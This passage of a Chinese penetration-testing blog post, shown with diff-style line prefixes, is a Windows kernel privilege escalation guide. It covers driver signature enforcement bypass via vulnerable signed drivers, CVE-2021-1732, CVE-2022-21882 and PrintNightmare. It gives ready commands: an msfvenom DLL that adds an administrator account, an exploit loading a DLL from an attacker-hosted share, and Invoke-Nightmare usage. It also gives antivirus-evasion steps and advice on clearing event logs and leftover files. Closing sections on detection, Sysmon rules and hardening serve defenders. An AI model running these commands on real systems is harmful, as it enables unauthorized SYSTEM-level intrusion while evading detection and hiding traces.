+<h2 id="四、驱动签名强制（DSE）绕过"><a href="#四、驱动签名强制（DSE）绕过" class="headerlink" title="四、驱动签名强制（DSE）绕过"></a>四、驱动签名强制（DSE）绕过</h2><h3 id="4-1-DSE-工作原理"><a href="#4-1-DSE-工作原理" class="headerlink" title="4.1 DSE 工作原理"></a>4.1 DSE 工作原理</h3><p>从64位Windows Vista开始，微软要求所有内核模式驱动必须经过数字签名。DSE（Driver Signature Enforcement）阻止加载未经签名的<code>.sys</code>文件。</p>
+<p>检测签名状态：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="class"><span class="keyword">enum</span> | <span class="title">findstr</span> <span class="title">testsigning</span></span></span><br><span class="line"><span class="class"><span class="title">bcdedit</span> /<span class="title">enum</span> | <span class="title">findstr</span> <span class="title">nointegritychecks</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-绕过方法"><a href="#4-2-绕过方法" class="headerlink" title="4.2 绕过方法"></a>4.2 绕过方法</h3><p><strong>方法一：启用 Test Signing Mode（需管理员+重启）</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> testsigning on</span><br><span class="line">bcdedit /<span class="built_in">set</span> nointegritychecks on</span><br><span class="line">shutdown /r /t <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>限制：需要管理员权限，需要重启，桌面右下角会出现”Test Mode”水印。</p>
+<p><strong>方法二：利用 TDL4 &#x2F; Uroburos 等 Bootkit</strong></p>
+<p>通过篡改内核中的<code>g_CiOptions</code>（Code Integrity 全局变量）来关闭签名校验：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 内核中 CI.dll 维护的全局标志</span></span><br><span class="line">ULONG g_CiOptions;  <span class="comment">// 值为 0 表示禁用 DSE</span></span><br></pre></td></tr></table></figure>
+
+<p>公开工具如 <strong>DSEFix</strong> 利用已知的内核驱动漏洞（如WinRing0、Capcom驱动）来写入<code>g_CiOptions</code>。</p>
+<p><strong>方法三：利用存在签名的漏洞驱动</strong></p>
+<p>这是一种更隐蔽的方式——加载一个拥有合法签名但存在漏洞的驱动，再通过该驱动的漏洞执行任意内核代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">已知可利用的签名驱动：</span><br><span class="line">- Capcom.sys    — 任意物理内存读写</span><br><span class="line">- WinRing0.sys  — I/O 端口访问</span><br><span class="line">- RTCore64.sys  — MSI Afterburner 驱动，任意MSR读写</span><br><span class="line">- GVCIDrv64.sys — Gigabyte 驱动</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用 RTCore64.sys 关闭 DSE（示例代码思路）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 加载 RTCore64.sys（它有合法签名，DSE不会拦截）</span><br><span class="line">2. 通过 DeviceIoControl 调用驱动的漏洞功能</span><br><span class="line">3. 该驱动允许读写任意MSR（Model Specific Register）</span><br><span class="line">4. 通过 MSR 修改内核标志位以禁用 SMEP/SMAP</span><br><span class="line">5. 或者通过驱动的物理内存读写能力修改 g_CiOptions</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法四：利用 CVE-2019-16098 (Rtkio64.sys)</strong></p>
+<p>Micro-Star MSI Afterburner的驱动<code>RTCore64.sys</code>开放了任意物理内存读写的IOCTL接口：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IOCTL 0x80002008 — 写入指定物理地址</span></span><br><span class="line"><span class="comment">// IOCTL 0x80002000 — 读取指定物理地址</span></span><br><span class="line">HANDLE hDevice = CreateFileA(<span class="string">&quot;\\\\.\\RTCore64&quot;</span>, ...);</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line">DeviceIoControl(hDevice, <span class="number">0x80002008</span>, &amp;input, <span class="keyword">sizeof</span>(input), <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bytesReturned, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+<p>通过该能力可定位并修改内核中的<code>g_CiOptions</code>，进而加载未签名驱动。</p>
+<hr>
+<h2 id="五、CVE-2021-1732：win32k-窗口内核提权"><a href="#五、CVE-2021-1732：win32k-窗口内核提权" class="headerlink" title="五、CVE-2021-1732：win32k 窗口内核提权"></a>五、CVE-2021-1732：win32k 窗口内核提权</h2><h3 id="5-1-漏洞概述"><a href="#5-1-漏洞概述" class="headerlink" title="5.1 漏洞概述"></a>5.1 漏洞概述</h3><ul>
+<li><strong>影响范围</strong>：Windows 10 (1809&#x2F;1909&#x2F;2004&#x2F;20H2)、Windows Server 2019&#x2F;20H2</li>
+<li><strong>漏洞类型</strong>：win32kfull.sys 中存在窗口对象（tagWND）的 Use-After-Free</li>
+<li><strong>后果</strong>：本地提权至SYSTEM</li>
+<li><strong>利用复杂度</strong>：中等，公开PoC存在</li>
+</ul>
+<h3 id="5-2-漏洞根因"><a href="#5-2-漏洞根因" class="headerlink" title="5.2 漏洞根因"></a>5.2 漏洞根因</h3><p><code>win32kfull.sys</code> 中的 <code>xxxCreateWindowEx</code> 在创建滚动条（ScrollBar）窗口时，回调 <code>xxxClientToScreen</code> 会发送 <code>WM_NCCALCSIZE</code> 消息到用户态钩子函数。用户态可在钩子中调用 <code>DestroyWindow</code> 释放窗口对象，导致返回内核后继续操作已释放的内存（UAF）。</p>
+<h3 id="5-3-利用过程"><a href="#5-3-利用过程" class="headerlink" title="5.3 利用过程"></a>5.3 利用过程</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译好的Exploit（需自行编译以绕过杀软）</span></span><br><span class="line">CVE<span class="literal">-2021-1732</span>.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预期输出：</span></span><br><span class="line"><span class="comment"># [*] Target: Windows 10 20H2 (Build 19042)</span></span><br><span class="line"><span class="comment"># [+] Exploit Successfully!</span></span><br><span class="line"><span class="comment"># [+] Spawning SYSTEM shell...</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>PoC 关键逻辑（伪代码）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 创建两个窗口，设置父窗口关系</span><br><span class="line">2. 通过 SetWindowsHookEx 挂载 WH_CALLWNDPROC 钩子</span><br><span class="line">3. 创建第三个窗口触发 WM_NCCALCSIZE</span><br><span class="line">4. 在钩子回调中调用 DestroyWindow，释放窗口</span><br><span class="line">5. 内核返回后继续使用已释放的 tagWND → UAF</span><br><span class="line">6. 利用堆喷（Heap Spray）技术占位被释放的内存</span><br><span class="line">7. 通过伪造 tagWND 结构读取 `gSharedInfo` 进而修改 token</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-防御"><a href="#5-4-防御" class="headerlink" title="5.4 防御"></a>5.4 防御</h3><ul>
+<li>安装2021年2月安全更新（KB4601319）</li>
+<li>EDR规则检测对<code>win32kfull.sys</code>的异常回调</li>
+</ul>
+<hr>
+<h2 id="六、CVE-2022-21882：Win32k-本地提权漏洞"><a href="#六、CVE-2022-21882：Win32k-本地提权漏洞" class="headerlink" title="六、CVE-2022-21882：Win32k 本地提权漏洞"></a>六、CVE-2022-21882：Win32k 本地提权漏洞</h2><h3 id="6-1-漏洞概述"><a href="#6-1-漏洞概述" class="headerlink" title="6.1 漏洞概述"></a>6.1 漏洞概述</h3><ul>
+<li><strong>影响范围</strong>：Windows 10 &#x2F; 11、Windows Server 2019&#x2F;2022</li>
+<li><strong>漏洞类型</strong>：win32k 中的输入验证不足导致的内存损坏</li>
+<li><strong>后果</strong>：通过竞态条件实现本地SYSTEM提权</li>
+<li><strong>公开利用</strong>：有PoC，利用难度中等偏高</li>
+</ul>
+<h3 id="6-2-技术分析"><a href="#6-2-技术分析" class="headerlink" title="6.2 技术分析"></a>6.2 技术分析</h3><p>漏洞位于 <code>win32kbase.sys</code> 的 <code>xxxMenuWindowProc</code> &#x2F; 菜单处理逻辑中。攻击者通过以下方式触发：</p>
+<ol>
+<li>并发地在不同线程中操作同一个菜单对象</li>
+<li>利用 <code>SetWindowLongPtr</code> 和 <code>EndMenu</code> 之间的竞态条件</li>
+<li>在窗口销毁后仍持有悬挂指针</li>
+<li>通过内存占位技术将悬挂指针重新指向可控数据</li>
+</ol>
+<p><strong>竞态窗口示意图：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">线程A: EndMenu → 释放菜单窗口内存</span><br><span class="line">线程B: SetWindowLongPtr → 在释放后仍向原地址写入数据</span><br><span class="line">       |</span><br><span class="line">       +→ 悬挂指针 → 内存占位 → 内核任意写入 → Token 替换</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-利用要点"><a href="#6-3-利用要点" class="headerlink" title="6.3 利用要点"></a>6.3 利用要点</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查是否易受攻击（安装 KB5010386 之前）</span></span><br><span class="line"><span class="built_in">Get-HotFix</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.HotFixID <span class="operator">-eq</span> <span class="string">&quot;KB5010386&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如返回空，说明该补丁未安装，可能存在漏洞</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用难点：</strong></p>
+<ul>
+<li>竞态条件触发概率非100%，多次运行常见</li>
+<li>堆喷布局在不同版本的Windows上需调整</li>
+<li>虚拟机环境下的时机可能不同于物理机，需反复调试</li>
+</ul>
+<hr>
+<h2 id="七、PrintNightmare：CVE-2021-34527-Print-Spooler"><a href="#七、PrintNightmare：CVE-2021-34527-Print-Spooler" class="headerlink" title="七、PrintNightmare：CVE-2021-34527 (Print Spooler)"></a>七、PrintNightmare：CVE-2021-34527 (Print Spooler)</h2><h3 id="7-1-漏洞概述"><a href="#7-1-漏洞概述" class="headerlink" title="7.1 漏洞概述"></a>7.1 漏洞概述</h3><ul>
+<li><strong>影响范围</strong>：几乎所有受支持的 Windows 版本</li>
+<li><strong>漏洞类型</strong>：RpcAddPrinterDriverEx 未正确验证调用者权限</li>
+<li><strong>后果</strong>：低权限域用户可加载恶意驱动，远程代码执行+本地SYSTEM提权</li>
+<li><strong>CVSS v3.1</strong>：8.8 (High)</li>
+</ul>
+<p>PrintNightmare 实际上涵盖两个漏洞：</p>
+<ul>
+<li><strong>CVE-2021-34527</strong>：远程代码执行（RCE）角度</li>
+<li><strong>CVE-2021-1675</strong>：本地权限提升（LPE）角度</li>
+</ul>
+<p>两者指向同一根源——Print Spooler服务的<code>RpcAddPrinterDriverEx</code>函数没有严格执行驱动签名与权限检查。</p>
+<h3 id="7-2-漏洞根因"><a href="#7-2-漏洞根因" class="headerlink" title="7.2 漏洞根因"></a>7.2 漏洞根因</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 简化后的存在缺陷的逻辑</span></span><br><span class="line">RpcAddPrinterDriverEx(...)&#123;</span><br><span class="line">    <span class="comment">// 没有验证调用者是否为管理员</span></span><br><span class="line">    <span class="comment">// 没有充分验证驱动DLL的签名</span></span><br><span class="line">    <span class="keyword">if</span> (CopyDriverToSystem32() &amp;&amp; LoadDriverIntoSpooler())&#123;</span><br><span class="line">        <span class="comment">// 驱动在 SYSTEM 进程中加载并执行</span></span><br><span class="line">        <span class="comment">// 攻击者的恶意 DLL 获得 SYSTEM 权限代码执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下，安装打印机驱动需要<code>SeLoadDriverPrivilege</code>（仅管理员和打印操作员拥有）。但该函数内部验证逻辑存在缺陷，使普通用户可以绕过此限制。</p>
+<h3 id="7-3-本地提权利用"><a href="#7-3-本地提权利用" class="headerlink" title="7.3 本地提权利用"></a>7.3 本地提权利用</h3><p><strong>检测是否受影响：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Service</span> <span class="literal">-Name</span> Spooler | <span class="built_in">Select-Object</span> Name, Status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 Point and Print 注册表设置</span></span><br><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;NoWarningNoElevationOnInstall&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用步骤：</strong></p>
+<ol>
+<li>生成恶意 DLL：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 msfvenom 生成</span></span><br><span class="line">msfvenom -p windows/x64/exec CMD=<span class="string">&quot;net user hacker Pass123! /add &amp;&amp; net localgroup administrators hacker /add&quot;</span> \</span><br><span class="line">         -f dll -o evil.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或用 Impacket 的 ntlmrelayx.py 生成</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>使用公开Exploit（Python版本）：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cube0x0 的 CVE-2021-1675 脚本</span></span><br><span class="line">python3 CVE-2021-1675.py <span class="string">&#x27;DOMAIN/user:password@DC_IP&#x27;</span> <span class="string">&#x27;\\ATTACKER_IP\share\evil.dll&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># calebstewart 的 CVE-2021-1675 (纯PowerShell远程利用版本)</span></span><br><span class="line">python3 printnightmare.py -dll evil.dll -target-ip 10.0.0.5 -username user -password pass</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>本地提权（仅需低权限用户）：</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过本地 Print Spooler RPC 触发</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\CVE<span class="literal">-2021-1675</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-Nightmare</span> <span class="literal">-DLL</span> <span class="string">&quot;C:\temp\adduser.dll&quot;</span> <span class="literal">-NewUser</span> <span class="string">&quot;pwned&quot;</span> <span class="literal">-NewPassword</span> <span class="string">&quot;Pass123!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-实际的坑（Field-Notes）"><a href="#7-4-实际的坑（Field-Notes）" class="headerlink" title="7.4 实际的坑（Field Notes）"></a>7.4 实际的坑（Field Notes）</h3><ul>
+<li><strong>Spooler服务必须运行</strong>：部分安全基线已禁用该服务，需检查<code>Spooler</code>服务状态</li>
+<li><strong>防病毒软件拦截</strong>：打印驱动复制到<code>C:\Windows\System32\spool\drivers\</code>时被AV删除</li>
+<li><strong>版本差异</strong>：公开脚本在不同Build上参数可能不同，Windows Server 2016&#x2F;2019&#x2F;2022需分别测试</li>
+<li><strong>日志痕迹</strong>：驱动安装过程会在<code>System</code>事件日志的<code>Microsoft-Windows-PrintService/Admin</code>下留下大量记录，事后清理需注意</li>
+<li><strong>多次利用冲突</strong>：驱动文件名重复会导致安装失败，使用随机命名并清理残留文件</li>
+</ul>
+<h3 id="7-5-修复与缓解"><a href="#7-5-修复与缓解" class="headerlink" title="7.5 修复与缓解"></a>7.5 修复与缓解</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 临时缓解：停止 Print Spooler 服务</span></span><br><span class="line"><span class="built_in">Stop-Service</span> Spooler <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-Service</span> Spooler <span class="literal">-StartupType</span> Disabled</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生产环境推荐（组策略）：</span></span><br><span class="line"><span class="comment"># 计算机配置 → 管理模板 → 打印机</span></span><br><span class="line"><span class="comment"># &quot;限制指向并打印到这些服务器&quot; → 启用 → 安全服务器列表</span></span><br><span class="line"><span class="comment"># &quot;指向并打印限制&quot; → 启用 → &quot;仅显示安装新的连接的包和驱动程序时的警告和提升提示&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>微软补丁：KB5005010 + 后续累积更新。注意：微软发布了多个迭代补丁，原始的KB5005010并未完全修复所有攻击向量。</p>
+<hr>
+<h2 id="八、通用内核提权方法论总结"><a href="#八、通用内核提权方法论总结" class="headerlink" title="八、通用内核提权方法论总结"></a>八、通用内核提权方法论总结</h2><h3 id="8-1-流程总览"><a href="#8-1-流程总览" class="headerlink" title="8.1 流程总览"></a>8.1 流程总览</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">获得初始立足点 (user-level shell)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">信息收集 (systeminfo / Get-HotFix)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">补丁对比分析 (WES-NG / Watson / 手动)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">候选漏洞筛选 (EoP 类型 / 有公开Exploit)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">Exploit投递与编译 (免杀 / 架构匹配)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">执行提权 (Spawning SYSTEM shell)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">持久化与横向移动</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-Exploit-选择决策树"><a href="#8-2-Exploit-选择决策树" class="headerlink" title="8.2 Exploit 选择决策树"></a>8.2 Exploit 选择决策树</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌─ 已知补丁缺失？── 是 ─→ 匹配公共Exploit</span><br><span class="line">│                        ├─ MS16-032 (Win7/2008R2)</span><br><span class="line">│                        ├─ CVE-2021-1732 (Win10 18H1-20H2)</span><br><span class="line">│                        ├─ CVE-2022-21882 (Win10/11)</span><br><span class="line">│                        └─ PrintNightmare (全版本)</span><br><span class="line">│</span><br><span class="line">└─ 无已知漏洞 ─→ 检查驱动运行状态</span><br><span class="line">                 ├─ 第三方可利用驱动？</span><br><span class="line">                 │   ├─ RTCore64.sys → DSE绕过</span><br><span class="line">                 │   ├─ Capcom.sys → 物理内存读写</span><br><span class="line">                 │   └─ ...</span><br><span class="line">                 └─ 自定义漏洞挖掘</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-免杀最低要求"><a href="#8-3-免杀最低要求" class="headerlink" title="8.3 免杀最低要求"></a>8.3 免杀最低要求</h3><p>针对内核Exploit的规避：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 重编译 → 改变编译时元数据的哈希</span><br><span class="line">2. 字符串混淆 → 避免 &quot;CVE-2021-1732&quot; &quot;Exploit&quot; 等静态特征</span><br><span class="line">3. API 动态解析 → 而非静态导入 CreateRemoteThread / WriteProcessMemory</span><br><span class="line">4. Shellcode 分离与加密 → AES/XOR 编码载荷，运行时解密</span><br><span class="line">5. 进程注入目标选择 → 避免注入到 C:\Windows\System32\ 下敏感进程（首选 svchost.exe / 低风险进程）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、防御视角：检测与加固"><a href="#九、防御视角：检测与加固" class="headerlink" title="九、防御视角：检测与加固"></a>九、防御视角：检测与加固</h2><h3 id="9-1-检测指标"><a href="#9-1-检测指标" class="headerlink" title="9.1 检测指标"></a>9.1 检测指标</h3><ul>
+<li>非管理员进程调用<code>AdjustTokenPrivileges</code>开启<code>SeDebugPrivilege</code></li>
+<li><code>win32kfull.sys</code> &#x2F; <code>win32kbase.sys</code> 中产生异常调用栈</li>
+<li><code>mscorsvw.exe</code> 或 <code>svchost.exe</code> 以外的进程加载打印机驱动DLL</li>
+<li>非签名驱动的<code>DeviceIoControl</code>高频调用</li>
+<li>短时间窗口内单一进程触发多个<code>SYSTEM</code>令牌打开操作</li>
+</ul>
+<h3 id="9-2-Sysmon-检测规则"><a href="#9-2-Sysmon-检测规则" class="headerlink" title="9.2 Sysmon 检测规则"></a>9.2 Sysmon 检测规则</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Sysmon</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ProcessAccess</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 检测非SYSTEM进程获取SYSTEM进程句柄 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">GrantedAccess</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>0x1fffff<span class="tag">&lt;/<span class="name">GrantedAccess</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TargetImage</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>lsass.exe<span class="tag">&lt;/<span class="name">TargetImage</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ProcessAccess</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">DriverLoad</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 检测未签名驱动加载 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Signature</span> <span class="attr">condition</span>=<span class="string">&quot;is&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">Signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">DriverLoad</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Sysmon</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="9-3-系统加固建议"><a href="#9-3-系统加固建议" class="headerlink" title="9.3 系统加固建议"></a>9.3 系统加固建议</h3><table>
+<thead>
+<tr>
+<th>措施</th>
+<th>效果</th>
+<th>副作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>及时安装安全更新</td>
+<td>阻止已知CVE</td>
+<td>无（正常运维成本）</td>
+</tr>
+<tr>
+<td>启用 Credential Guard</td>
+<td>保护 LSASS 内存</td>
+<td>部分应用兼容性问题</td>
+</tr>
+<tr>
+<td>禁用不必要的驱动（blocklist）</td>
+<td>阻止DSE绕过</td>
+<td>可能导致硬件外设失效</td>
+</tr>
+<tr>
+<td>启用 HVCI (Memory Integrity)</td>
+<td>防止内核内存篡改</td>
+<td>约5%性能开销，旧驱动兼容性</td>
+</tr>
+<tr>
+<td>AppLocker &#x2F; WDAC</td>
+<td>限制未授权代码执行</td>
+<td>管理成本高</td>
+</tr>
+<tr>
+<td>停止 Print Spooler 服务（非打印服务器）</td>
+<td>阻止PrintNightmare</td>
+<td>无法执行打印任务</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="十、免责声明"><a href="#十、免责声明" class="headerlink" title="十、免责声明"></a>十、免责声明</h2><p><strong>重要法律声明：</strong> 本文所述技术与工具仅供安全研究、授权渗透测试及防御建设参考。未经系统所有者明确书面授权，在任意系统上执行提权操作均属违法行为，可能触犯《刑法》第285条（非法侵入计算机信息系统罪）、第286条（破坏计算机信息系统罪）等相关法律法规。作者不承担任何因滥用本文信息导致的法律责任。</p>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide">MSRC Security Update Guide</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-1732">CVE-2021-1732 Detail - NVD</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/advisories/ZDI-22-257/">CVE-2022-21882 Analysis - ZDI</a></li>
+<li><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">CVE-2021-34527 PrintNightmare - MSRC Advisory</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">Windows Exploit Suggester - Next Generation (WES-NG)</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">Watson - Missing KB Enumeration</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Barakat/CVE-2019-16098">RTCore64.sys DSE Bypass Analysis</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675">[cube0x0] CVE-2021-1675 PrintNightmare LPE</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag"># 权限提升</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Windows-privesc-UAC-bypass/" rel="prev" title="Windows提权：UAC绕过技巧">
+                  <i class="fa fa-angle-left"></i> Windows提权：UAC绕过技巧
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Intranet-information-gathering/" rel="next" title="内网信息收集方法论">
+                  内网信息收集方法论 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
